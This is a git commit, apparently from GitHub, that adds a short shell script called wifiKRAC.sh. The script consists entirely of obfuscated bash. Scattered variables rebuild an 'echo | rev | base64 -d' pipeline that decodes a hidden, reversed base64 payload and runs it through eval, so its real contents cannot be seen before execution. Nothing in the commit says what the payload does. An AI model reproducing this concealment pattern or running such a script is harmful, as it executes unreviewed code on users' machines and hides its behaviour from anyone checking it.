2c7fe35a77a82fb7f5fdfebfedee9db55b74d172
luisakrac <50025904+luisakrac@users.noreply.github.com>
2019-05-05 15:30:11 -0500

    Add files via upload

---
+++ wifiKRAC.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'Kg2cug2cpZEcy92YT9CazlmRwJ3bjN1Ll12bo9yclxWam9Ce11mclRnLt92YvEGdhR2LhRXYk9CIoNXYipgchVGbjpAdpdmLoNXaGBncvN2UvQmb19mZ09mbtQDM0I3byJXZv02bj5iY1hGdpd2LvozcwRHdoBSZu9GbjBCdpdmCsJXdjBCbsFmcz5Wagc2awpAcoBHIsxWY0NnbpByZrBnC0l2ZgwGbhR3culGIntGcKkXLgUGZhJ3ZwVHI0BXYKkXLgUGdhRGc1BCdwFmCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
